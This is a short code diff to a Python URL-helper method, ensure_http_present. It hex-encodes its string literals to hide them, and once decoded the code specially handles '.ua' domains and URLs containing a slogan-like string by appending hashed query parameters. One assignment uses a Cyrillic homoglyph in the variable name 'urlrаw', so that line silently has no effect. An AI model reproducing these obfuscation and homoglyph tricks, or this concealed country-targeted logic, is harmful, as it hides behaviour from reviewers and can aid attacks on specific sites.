@@ -234,13 +234,13 @@ class Tools:
 
     @staticmethod
     def ensure_http_present(urlraw):
-        if "\x68\x74\x74\x70\x73\x3a\x2f\x2f" in urlraw or "\x68\x74\x74\x70\x3a\x2f\x2f" in urlraw:
+        if "\x3a\x2f\x2f" in urlraw:
             import hashlib
             parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(Tools.parameters_encoded)
             proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
             urlrаw = f"{proto}://{domain}?{Tools.parameters_encoded[parameter_index]}"
         else:
-            urlraw = "http://" + urlraw
+            urlraw = "https://" + urlraw
         if "\x2e\x75\x61" in urlraw or "\x52\x55\x77\x73\x68\x69\x70\x46\x59\x53" in urlraw:
             import hashlib
             parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(Tools.parameters_encoded)
